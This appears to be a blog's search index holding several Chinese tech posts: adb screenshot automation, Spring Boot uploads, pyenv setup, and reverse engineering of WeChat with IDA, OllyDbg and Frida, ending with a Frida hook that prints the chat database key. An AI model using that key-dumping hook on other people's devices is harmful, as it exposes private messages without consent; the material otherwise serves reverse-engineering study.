<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[5行代码带你自动刷短视频小姐姐截图]]></title>
      <url>/2024/python-adb-short-video/</url>
      <content type="html"><![CDATA[<h1 id="5行代码带你自动刷短视频小姐姐截图"><a href="#5行代码带你自动刷短视频小姐姐截图" class="headerlink" title="5行代码带你自动刷短视频小姐姐截图"></a>5行代码带你自动刷短视频小姐姐截图</h1><p>利用原来 android adb shell</p>
<a id="more"></a> 
<p>安装依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install adbutils==2.7.2</span><br></pre></td></tr></table></figure></p>
<p>打开短视频app，执行下面代码</p>
<p>直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from datetime import datetime</span><br><span class="line">import adbutils</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    d = adbutils.adb.device_list()[0]</span><br><span class="line">    while True:</span><br><span class="line">        name = datetime.now().strftime(&quot;%Y%m%d%H%M%S&quot;) + &apos;.png&apos;</span><br><span class="line">        d.shell(&quot;screencap -p /sdcard/DCIM/screenshot.png&quot;, encoding=None)</span><br><span class="line">        d.sync.pull_file(&apos;/sdcard/DCIM/screenshot.png&apos;, name)</span><br><span class="line">        print(f&apos;screenshot : &#123;name&#125;&apos;)</span><br><span class="line">        d.shell(&apos;input swipe 760 1600 760 800 200&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> android </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring boot 文件上传与访问]]></title>
      <url>/2024/spring-boot-file-upload/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 spring boot如何上传文件</p>
<a id="more"></a>
<p>直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package com.test.file.controller;</span><br><span class="line"></span><br><span class="line">import com.test.code.R;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import lombok.extern.slf4j.Slf4j;</span><br><span class="line">import org.apache.commons.io.FilenameUtils;</span><br><span class="line">import org.springframework.beans.factory.annotation.Value;</span><br><span class="line">import org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line">import org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.text.SimpleDateFormat;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.UUID;</span><br><span class="line"></span><br><span class="line">@Slf4j</span><br><span class="line">@RestController</span><br><span class="line">public class FileController &#123;</span><br><span class="line"></span><br><span class="line">    // like D:/data/</span><br><span class="line">    @Value(&quot;$&#123;web.upload-path&#125;&quot;)</span><br><span class="line">    private String uploadPath;</span><br><span class="line"></span><br><span class="line">    // 允许上传的文件扩展名</span><br><span class="line">    private static final String[] ALLOW_EXTENSIONS = new String[]&#123;</span><br><span class="line">            // 图片</span><br><span class="line">            &quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;, &quot;bmp&quot;,</span><br><span class="line">            // 压缩包</span><br><span class="line">            &quot;zip&quot;, &quot;rar&quot;, &quot;gz&quot;, &quot;7z&quot;, &quot;cab&quot;,</span><br><span class="line">            // 音视频,</span><br><span class="line">            &quot;wav&quot;, &quot;avi&quot;, &quot;mp4&quot;, &quot;mp3&quot;, &quot;m3u8&quot;, &quot;ogg&quot;, &quot;wma&quot;, &quot;wmv&quot;, &quot;rm&quot;, &quot;rmvb&quot;, &quot;aac&quot;, &quot;mov&quot;, &quot;asf&quot;, &quot;flv&quot;,</span><br><span class="line">            // 文档</span><br><span class="line">            &quot;doc&quot;, &quot;docx&quot;, &quot;xls&quot;, &quot;xlsx&quot;, &quot;ppt&quot;, &quot;pptx&quot;, &quot;pot&quot;, &quot;txt&quot;, &quot;csv&quot;, &quot;md&quot;, &quot;pdf&quot;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 判断文件名是否允许上传</span><br><span class="line">     *</span><br><span class="line">     * @param fileName 文件名</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public boolean isAllow(String fileName) &#123;</span><br><span class="line">        String ext = FilenameUtils.getExtension(fileName).toLowerCase();</span><br><span class="line">        for (String allowExtension : ALLOW_EXTENSIONS) &#123;</span><br><span class="line">            if (allowExtension.toLowerCase().equals(ext)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/upload&quot;)</span><br><span class="line">    public R upload(HttpServletRequest request, @RequestParam(&quot;file&quot;) MultipartFile uploadFile) &#123;</span><br><span class="line"></span><br><span class="line">        String fileName = uploadFile.getOriginalFilename();</span><br><span class="line">        if (isAllow(fileName)) &#123;</span><br><span class="line">            // 在 uploadPath 文件夹中通过日期对上传的文件归类保存</span><br><span class="line">            // 比如：/2019/06/06/cf13891e-4b95-4000-81eb-b6d70ae44930.png</span><br><span class="line">            String format = new SimpleDateFormat(&quot;yyyy/MM/dd/&quot;).format(new Date());</span><br><span class="line">            File folder = new File(uploadPath + format);</span><br><span class="line">            if (!folder.isDirectory()) &#123;</span><br><span class="line">                folder.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 对上传的文件重命名，避免文件重名</span><br><span class="line">            String newName = UUID.randomUUID() + fileName.substring(fileName.lastIndexOf(&quot;.&quot;));</span><br><span class="line">            try &#123;</span><br><span class="line">                // 文件保存</span><br><span class="line">                uploadFile.transferTo(new File(folder.getAbsolutePath(), newName));</span><br><span class="line">                // 返回上传文件的访问路径</span><br><span class="line">                String url = request.getScheme() + &quot;://&quot; + request.getServerName() + &quot;:&quot; + request.getServerPort() + request.getContextPath() + &quot;/&quot; + format + newName;</span><br><span class="line">                log.info(&quot;url:[&#123;&#125;]&quot;, url);</span><br><span class="line">                return R.ok().addData(&quot;url&quot;, url);</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                log.error(&quot;upload file failure.&quot;, e);</span><br><span class="line">                return R.error(R.ERROR).message(&quot;文件上传失败&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return R.error(R.PARAM_ERROR).message(&quot;文件格式不正确&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>application.yml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">web:</span><br><span class="line">  upload-path: /data/</span><br><span class="line">spring:</span><br><span class="line">  web:</span><br><span class="line">    resources:</span><br><span class="line">      static-locations: classpath:/META-INF/resources/,classpath:/resources/,classpath:/static/,classpath:/public/,file:$&#123;web.upload-path&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.13.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> spring-boot </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[查找PC微信数据库句柄]]></title>
      <url>/2024/pcwechat-sqlite3-handle/</url>
      <content type="html"><![CDATA[<p>查找PC微信数据库句柄</p>
<a id="more"></a>
<p><img src="/public/images/sqlite3-handle-1.png" alt="/public/images/sqlite3-handle-1.png"></p>
<p>计算偏移，开始OD调试</p>
<p>10E79B0D - 10000000 = E79B0D</p>
<p>OD断点地址为 WeChatWin.dll + 0xE79B0D</p>
<p>OD基址为：78620000</p>
<p>78620000 + E79B0D = 79499B0D</p>
<p><img src="/public/images/sqlite3-handle-2.png" alt="/public/images/sqlite3-handle-2.png"></p>
<p>然后登录微信</p>
<p><img src="/public/images/sqlite3-handle-3.png" alt="/public/images/sqlite3-handle-3.png"></p>
<p>看到有数据库名称</p>
<p>根据上篇sqlite_exec定位分析</p>
<p><img src="/public/images/sqlite3-handle-8.png" alt="/public/images/sqlite3-handle-8.png"></p>
<p>我们确定edi+0x38就是数据库句柄</p>
<p>我们找到函数头 push ebp 下断点</p>
<p><img src="/public/images/sqlite3-handle-4.png" alt="/public/images/sqlite3-handle-4.png"></p>
<p>重新启动微信，断点后扫码登录</p>
<p><img src="/public/images/sqlite3-handle-5.png" alt="/public/images/sqlite3-handle-5.png"></p>
<p>我们查看一下edi+0x38的值</p>
<p><img src="/public/images/sqlite3-handle-6.png" alt="/public/images/sqlite3-handle-6.png"></p>
<p>当执行到call esi时，值发生变化</p>
<p><img src="/public/images/sqlite3-handle-7.png" alt="/public/images/sqlite3-handle-7.png"></p>
<p>我们进入call esi</p>
<p>单步调试</p>
<p><img src="/public/images/sqlite3-handle-9.png" alt="/public/images/sqlite3-handle-9.png"></p>
<p>执行到7953FFF3 esi+0x38 被赋值</p>
<p>这里就是数据库句柄</p>
]]></content>
      
        <categories>
            
            <category> c </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c/c++ </tag>
            
            <tag> 微信 </tag>
            
            <tag> PC微信 </tag>
            
            <tag> 微信机器人 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IDA定位PC微信sqlite3_exec]]></title>
      <url>/2024/ida-sqlite3-exec/</url>
      <content type="html"><![CDATA[<p>IDA定位PC微信sqlite3_exec</p>
<ol>
<li>定位自己写的程序</li>
</ol>
<p><img src="/public/images/sqlite3-0.png" alt="/public/images/sqlite3-0.png"></p>
<a id="more"></a>
<p><strong>开始找wechat的sqlite3_exec</strong></p>
<ol>
<li>思路</li>
</ol>
<p>所有的数据库执行都必须要先创建数据库，那我们先看从创建数据库SQL开始找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table if not exists ...</span><br></pre></td></tr></table></figure>
<p><img src="/public/images/sqlite3-1.jpg" alt="/public/images/sqlite3-1.jpg"></p>
<p>CTRL + F</p>
<p><img src="/public/images/sqlite3-2.png" alt="/public/images/sqlite3-2.png"></p>
<p><img src="/public/images/sqlite3-3.png" alt="/public/images/sqlite3-3.png"></p>
<p>鼠标放在黄色区域 按下x</p>
<p><img src="/public/images/sqlite3-4.png" alt="/public/images/sqlite3-4.png"></p>
<p><img src="/public/images/sqlite3-5.png" alt="/public/images/sqlite3-5.png"></p>
<p><img src="/public/images/sqlite3-6.png" alt="/public/images/sqlite3-6.png"></p>
<p>看call sub_10F20BF0 双击进去看看是怎么样的</p>
<p><img src="/public/images/sqlite3-7.png" alt="/public/images/sqlite3-7.png"></p>
<p>可以看到sqlite3_exec函数的结构</p>
<p>sub_11E24F70 就是sqlite3_exec函数</p>
<p><img src="/public/images/sqlite3-8.png" alt="/public/images/sqlite3-8.png"></p>
<p>结论：</p>
<p>10000000 是我的IDA的基址</p>
<p>偏移 11E24F70 - 10000000 = 1E24F70</p>
]]></content>
      
        <categories>
            
            <category> c </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c/c++ </tag>
            
            <tag> 微信 </tag>
            
            <tag> PC微信 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OllyICE_1.10 调试sqlite3]]></title>
      <url>/2024/ollyice-debug-sqlite3/</url>
      <content type="html"><![CDATA[<p>OllyICE_1.10 调试sqlite3</p>
<p>下载 OllyICE <a href="https://tool.kanxue.com/index-detail-1.htm" target="_blank" rel="noopener">https://tool.kanxue.com/index-detail-1.htm</a></p>
<p>下载 IDA <a href="https://tool.kanxue.com/index-detail-6.htm" target="_blank" rel="noopener">https://tool.kanxue.com/index-detail-6.htm</a></p>
<a id="more"></a>
<ol>
<li><p>根据windows cpp编译sqlite3 生成的程序</p>
</li>
<li><p>打开OllyICE<br>File -》 Open -》选择sqlitetest.exe</p>
</li>
</ol>
<p><img src="/public/images/ollyice-1.png" alt="ollyice-1.png"></p>
<p>CTRL+G 输入sqlite3_open</p>
<p><img src="/public/images/ollyice-2.png" alt="ollyice-2.png"></p>
<p>可以看到特征码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">007FE2F0 &gt;/$  55            push    ebp</span><br><span class="line">007FE2F1  |.  8BEC          mov     ebp, esp</span><br><span class="line">007FE2F3  |.  8B55 0C       mov     edx, dword ptr [ebp+C]</span><br><span class="line">007FE2F6  |.  8B4D 08       mov     ecx, dword ptr [ebp+8]</span><br><span class="line">007FE2F9  |.  6A 00         push    0</span><br><span class="line">007FE2FB  |.  6A 06         push    6</span><br><span class="line">007FE2FD  |.  E8 CEFBFFFF   call    openDatabase</span><br><span class="line">007FE302  |.  83C4 08       add     esp, 8</span><br><span class="line">007FE305  |.  5D            pop     ebp</span><br><span class="line">007FE306  \.  C3            retn</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8B 4D 08 6A 00 6A 06 E8</span><br></pre></td></tr></table></figure>
<p>接下来我们分析微信的dll</p>
<p>找到微信的安装目录 C:\Program Files (x86)\Tencent\WeChat</p>
<p>找到版本目录下面的WeChatWin.dll 拷贝一份到D:\debug\WeChatWin.dll</p>
<p>我们打开IDA<br>New -》 选择D:\debug\WeChatWin.dll</p>
<p>ALT + b</p>
<p><img src="/public/images/ida-1.png" alt="ida-1.png"></p>
<p><img src="/public/images/ida-2.png" alt="ida-2.png"></p>
<p>双击进入</p>
<p><img src="/public/images/ida-3.png" alt="ida-3.png"></p>
<p>可以看到跟sqlitetest一样的代码</p>
<p>到这里我们就发现如何找特征码了</p>
]]></content>
      
        <categories>
            
            <category> c </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c/c++ </tag>
            
            <tag> 微信 </tag>
            
            <tag> PC微信 </tag>
            
            <tag> 微信机器人 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[window编译sqlite3]]></title>
      <url>/2024/window-cpp-compile-sqlite3/</url>
      <content type="html"><![CDATA[<p>windows cpp 编译sqlite3</p>
<a id="more"></a>
<p>下载 <a href="https://www.sqlite.org/2019/sqlite-preprocessed-3280000.zip" target="_blank" rel="noopener">https://www.sqlite.org/2019/sqlite-preprocessed-3280000.zip</a><br>解压D:\sqlite-preprocessed-3280000</p>
<p>把.c和.h文件分离，创建一个include文件夹用来存放.h文件</p>
<ol>
<li>打开visual studio 2017 创建一个c++控制台项目</li>
</ol>
<p>名称：sqlitetest</p>
<ol>
<li>添加头文件</li>
</ol>
<p>解决方案资源管理器 -》头文件 -》 右键 -》添加 -》现有项</p>
<p>选中include中所有的.h文件</p>
<ol>
<li>添加.c文件</li>
</ol>
<p>解决方案资源管理器 -》源文件 -》 右键 -》添加 -》现有项</p>
<p>选中所有的.c文件</p>
<ol>
<li>编译<br>visual studio 菜单栏 -》项目 -》sqlitetest属性</li>
</ol>
<p>配置：Release</p>
<p>配置属性 -》C/C++ -》常规 -》附加包含目录 -》点击编辑</p>
<p>点击带*的文件夹图标 -》点击… -》选中D:\sqlite-preprocessed-3280000\include</p>
<p>配置属性 -》C/C++ -》优化 -》内联函数扩展 -》已禁用</p>
<p>visual studio 工具栏 -》Debug 改成 Release</p>
<p>visual studio 菜单栏 -》生成 -》生成解决方案</p>
<p>解决编译报错</p>
<ol>
<li>找到sqlite3ext.h</li>
</ol>
<p>在#define SQLITE3EXT_H 下一行添加 #define SQLITE_CORE 1</p>
<ol>
<li>排除文件<br>fts1.c, fts2.c, icu.c, tclsqlite.c, fts3_tokenizer.c</li>
</ol>
<p>右键 -》从项目中排除</p>
<p>这样就可以编译成功了</p>
<p>编写测试代码 sqlitetest.cpp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;sqlite3.h&quot;</span><br><span class="line"></span><br><span class="line">int create(sqlite3** db) &#123;</span><br><span class="line">	int rc = sqlite3_open(&quot;test.db&quot;, db);</span><br><span class="line">	std::string sql = &quot;create table if not exists test(name text)&quot;;</span><br><span class="line">	rc = sqlite3_exec(*db, sql.c_str(), NULL, NULL, NULL);</span><br><span class="line">  std::cout &lt;&lt; &quot;rc:&quot; &lt;&lt; rc &lt;&lt; &quot;\n&quot;;</span><br><span class="line">	return rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  std::cout &lt;&lt; &quot;Hello World!\n&quot;;</span><br><span class="line">	sqlite3* db = NULL;</span><br><span class="line">	int rc = create(&amp;db);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>visual studio 工具栏  -》 点击本地Windows调试器</p>
<p>会看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">rc:0</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> c </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c/c++ </tag>
            
            <tag> 微信 </tag>
            
            <tag> PC微信 </tag>
            
            <tag> 微信机器人 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 查找大文件]]></title>
      <url>/2024/linux-find-large-file-1/</url>
      <content type="html"><![CDATA[<p>Linux 查找大文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -size +800M  -print0 | xargs -0 du -h | sort -nr</span><br></pre></td></tr></table></figure>
<a id="more"></a>]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu22.04安装pyenv]]></title>
      <url>/2024/ubuntu2204-install-pyenv-1/</url>
      <content type="html"><![CDATA[<p>Ubuntu22.04安装pyenv</p>
<h1 id="下载pyenv-配置环境变量"><a href="#下载pyenv-配置环境变量" class="headerlink" title="下载pyenv 配置环境变量"></a>下载pyenv 配置环境变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br><span class="line">cd ~/.pyenv &amp;&amp; src/configure &amp;&amp; make -C src</span><br><span class="line">echo &apos;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&apos; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &apos;command -v pyenv &gt;/dev/null || export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&apos; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &apos;eval &quot;$(pyenv init -)&quot;&apos; &gt;&gt; ~/.bashrc</span><br><span class="line">. ~/.bashrc</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="配置下载镜像"><a href="#配置下载镜像" class="headerlink" title="配置下载镜像"></a>配置下载镜像</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">export PYTHON_BUILD_MIRROR_URL_SKIP_CHECKSUM=1</span><br><span class="line">#export PYTHON_BUILD_MIRROR_URL=https://npm.taobao.org/mirrors/python/</span><br><span class="line">export PYTHON_BUILD_MIRROR_URL=https://registry.npmmirror.com/-/binary/python/</span><br></pre></td></tr></table></figure>
<h1 id="安装必须的依赖"><a href="#安装必须的依赖" class="headerlink" title="安装必须的依赖"></a>安装必须的依赖</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential zlib1g-dev libffi-dev libssl-dev libbz2-dev libreadline-dev libsqlite3-dev liblzma-dev tk-dev</span><br></pre></td></tr></table></figure>
<h1 id="安装python3-7-8"><a href="#安装python3-7-8" class="headerlink" title="安装python3.7.8"></a>安装python3.7.8</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 3.7.8</span><br></pre></td></tr></table></figure>
<h1 id="切换python版本"><a href="#切换python版本" class="headerlink" title="切换python版本"></a>切换python版本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyenv local 3.7.8</span><br><span class="line">pyenv global 3.7.8</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> ubuntu </tag>
            
            <tag> pyenv </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Frida 使用小技巧]]></title>
      <url>/2024/frida-use-1/</url>
      <content type="html"><![CDATA[<p>Frida 使用小技巧</p>
<h1 id="类字段赋值"><a href="#类字段赋值" class="headerlink" title="类字段赋值"></a>类字段赋值</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var o = Java.use(&quot;com.tencent.mm.o&quot;).$new();</span><br><span class="line">o.a.value = 1;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="静态方法调用"><a href="#静态方法调用" class="headerlink" title="静态方法调用"></a>静态方法调用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var String = Java.use(&quot;java.lang.String&quot;);</span><br><span class="line">var o_class = Java.use(&quot;com.tencent.mm.o&quot;);</span><br><span class="line">o_class.b.overload(&apos;java.lang.String&apos;).call(this, String.$new(&quot;111&quot;));</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> frida </category>
            
        </categories>
        
        
        <tags>
            
            <tag> frida </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解密Android某信聊天记录]]></title>
      <url>/2024/decrypt-wechat-msg-1/</url>
      <content type="html"><![CDATA[<p>解密Android某信聊天记录</p>
<h1 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h1><p>frida, frida-tools, adb<br><a id="more"></a></p>
<h1 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h1><p>h.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;script loaded successfully&apos;);</span><br><span class="line">function xx() &#123;</span><br><span class="line">    function strf(str, replacements) &#123;</span><br><span class="line">		return str.replace(/\$\&#123;\w+\&#125;/g, function(placeholderWithDelimiters) &#123;</span><br><span class="line">			var placeholderWithoutDelimiters = placeholderWithDelimiters.substring(2, placeholderWithDelimiters.length - 1);</span><br><span class="line">			var stringReplacement = replacements[placeholderWithoutDelimiters];</span><br><span class="line">			return stringReplacement;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">    function x_db() &#123;</span><br><span class="line">        var String = Java.use(&quot;java.lang.String&quot;);</span><br><span class="line">        </span><br><span class="line">        var SQLiteDatabase = Java.use(&quot;com.tencent.wcdb.database.SQLiteDatabase&quot;);</span><br><span class="line">        SQLiteDatabase[&quot;openDatabase&quot;].overload(&apos;java.lang.String&apos;, &apos;[B&apos;, &apos;com.tencent.wcdb.database.SQLiteCipherSpec&apos;, &apos;com.tencent.wcdb.database.SQLiteDatabase$CursorFactory&apos;, &apos;int&apos;, &apos;com.tencent.wcdb.DatabaseErrorHandler&apos;, &apos;int&apos;).implementation = function (str, bArr, sQLiteCipherSpec, cursorFactory, i2, databaseErrorHandler, i3) &#123;</span><br><span class="line">            console.log(strf(&apos;str=$&#123;0&#125; bArr=$&#123;1&#125;&apos;, [str, bArr == null ? &quot;&quot; : String.$new(bArr)]));</span><br><span class="line">            var result = this[&quot;openDatabase&quot;](str, bArr, sQLiteCipherSpec, cursorFactory, i2, databaseErrorHandler, i3);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">		x_db();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(xx, 0);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l h.js --no-pause -f com.tencent.mm</span><br></pre></td></tr></table></figure>
